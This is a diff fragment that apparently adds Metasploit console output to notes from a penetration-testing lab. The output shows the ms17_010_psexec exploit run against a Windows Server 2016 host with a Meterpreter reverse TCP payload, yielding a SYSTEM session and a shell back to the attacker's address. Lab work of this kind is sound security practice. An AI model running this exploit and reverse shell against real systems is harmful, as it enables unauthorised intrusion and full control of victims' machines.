@@ -911,5 +911,23 @@ Also known as:
 
 View the full module info with the info -d command.
 
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.14.4
+LHOST => 10.10.14.4
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.14.4
+LHOST => 10.10.14.4
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run
+[*] Started reverse TCP handler on 10.10.14.4:4444 
+[*] 10.129.2.141:445 - Target OS: Windows Server 2016 Standard 14393
+[*] 10.129.2.141:445 - Built a write-what-where primitive...
+[+] 10.129.2.141:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.129.2.141:445 - Selecting PowerShell target
+[*] 10.129.2.141:445 - Executing the payload...
+[+] 10.129.2.141:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (190534 bytes) to 10.129.2.141
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.129.2.141:49673) at 2026-05-27 14:08:12 -0400
+
 
 ```
